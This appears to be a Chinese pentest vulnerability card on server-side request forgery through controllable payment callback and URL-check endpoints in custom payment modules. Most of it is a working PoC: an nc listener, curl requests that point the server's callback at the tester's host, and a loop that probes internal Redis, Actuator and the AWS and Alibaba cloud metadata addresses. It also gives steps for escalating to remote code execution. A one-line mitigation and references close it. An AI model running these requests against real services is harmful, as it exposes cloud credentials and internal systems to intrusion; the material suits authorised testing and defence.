---
title: 支付 / 回调地址可控 → 内网 SSRF（含云元数据）
cve: 无（业务逻辑）
severity: high
cvss: 8.5
product: 自研支付与通知模块
versions: 任意
ports: 80, 443
keywords: 回调, 支付, ssrf, 内网, 元数据, notify
entry: 支付配置/回调 URL/代理推广链接检测
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/pay/config      {"notifyUrl":"http://..."}
POST /api/agent/checkUrl  {"url":"http://..."}
POST /api/pay/test        {"callback":"http://..."}
```

## 前置条件

- 有"填 URL 让服务端访问"的功能（回调、图片抓取、链接检测）。

## PoC

```bash
# 1) 用自己控制的地址确认服务端会发起请求（先建 DNS 记录或起 listener）
nc -lvnp 8080
curl -s -X POST https://target/api/pay/test -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"callback":"http://yourip:8080/x"}'
# 判定：nc 收到请求 = 可发起

# 2) 打内网与云元数据（逐个试，注意回显方式）
for u in 'http://127.0.0.1:6379/' 'http://10.0.0.5:8080/actuator' \
         'http://169.254.169.254/latest/meta-data/' \
         'http://100.100.100.200/latest/meta-data/'; do
  curl -s -X POST https://target/api/agent/checkUrl -H "Authorization: Bearer <t>" \
    -H 'Content-Type: application/json' -d "{\"url\":\"$u\"}" | head -c 200; echo
done
# 判定：返回内网内容/不同错误码 = 命中
```

## 利用步骤

1. 先证明"能发起"（第 1 步），再测内网；
2. 云上优先 `169.254.169.254`（AWS）与 `100.100.100.200`（阿里云）；
3. Redis/Actuator 命中可直接升级为 RCE 链；
4. 证据：响应差异（时间/长度/内容）。

## 修复与缓解

- 白名单域名 + 禁止内网与元数据网段；回调只允许 https 且校验签名。

## 参考

- OWASP SSRF 防护速查；阿里云/AWS 元数据安全公告。
